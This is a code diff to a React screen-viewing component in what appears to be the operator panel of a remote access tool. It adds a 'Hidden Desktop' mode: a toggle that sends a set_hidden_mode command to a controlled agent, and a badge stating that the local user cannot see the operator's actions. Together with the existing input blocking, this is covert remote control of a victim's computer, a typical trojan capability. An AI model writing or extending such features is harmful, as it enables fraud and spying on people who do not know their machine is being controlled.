@@ -22,6 +22,7 @@ export function ScreenView({ agentId, onClose }) {
   const [displayCount, setDisplayCount] = useState(1)
   const [activeDisplay, setActiveDisplay] = useState(0)
   const [inputBlocked, setInputBlocked] = useState(false)
+  const [isHiddenMode, setIsHiddenMode] = useState(false)
 
   const pcRef = useRef(null)
   const imgRef = useRef(null)
@@ -307,6 +308,13 @@ export function ScreenView({ agentId, onClose }) {
     wsService.send({ type: 'block_input', agent_id: agentId, data: next })
   }
 
+  const toggleHiddenMode = () => {
+    if (!hasControl) return
+    const next = !isHiddenMode
+    setIsHiddenMode(next)
+    wsService.send({ type: 'set_hidden_mode', agent_id: agentId, data: next })
+  }
+
   const changeDisplay = (idx) => {
     setActiveDisplay(idx)
     wsService.send({ type: 'set_display', agent_id: agentId, data: idx })
@@ -349,6 +357,9 @@ export function ScreenView({ agentId, onClose }) {
             <button className={`hdr-btn ${inputBlocked ? 'active' : ''}`} onClick={toggleBlockInput} title="Block Remote Input" disabled={!hasControl}>
               {inputBlocked ? '🔒 Blocked' : '🔓 Block'}
             </button>
+            <button className={`hdr-btn ${isHiddenMode ? 'active' : ''}`} onClick={toggleHiddenMode} title="Invisible Control (Hidden Desktop)" disabled={!hasControl}>
+              {isHiddenMode ? '🕶 Hidden' : '👁 Visible'}
+            </button>
 
             <div className="quality-selector">
               {['low', 'balanced', 'high'].map(q => (
@@ -390,6 +401,9 @@ export function ScreenView({ agentId, onClose }) {
           <button className={`hdr-btn ${inputBlocked ? 'active' : ''}`} onClick={toggleBlockInput} title="Block Remote Input" disabled={!hasControl}>
             {inputBlocked ? '🔒 Blocked' : '🔓 Block'}
           </button>
+          <button className={`hdr-btn ${isHiddenMode ? 'active' : ''}`} onClick={toggleHiddenMode} title="Invisible Control (Hidden Desktop)" disabled={!hasControl}>
+            {isHiddenMode ? '🕶 Hidden' : '👁 Visible'}
+          </button>
 
           <div className="quality-selector">
             {['low', 'balanced', 'high'].map(q => (
@@ -409,7 +423,9 @@ export function ScreenView({ agentId, onClose }) {
 
       {/* ── Control active badge ── */}
       {hasControl && (
-        <div className="control-badge">🔴 Remote Control Active — ESC to exit</div>
+        <div className="control-badge">
+          {isHiddenMode ? '🕶 Hidden Desktop Active — Local user cannot see your actions' : '🔴 Remote Control Active — ESC to exit'}
+        </div>
       )}
 
       {/* ── Stream canvas ── */}
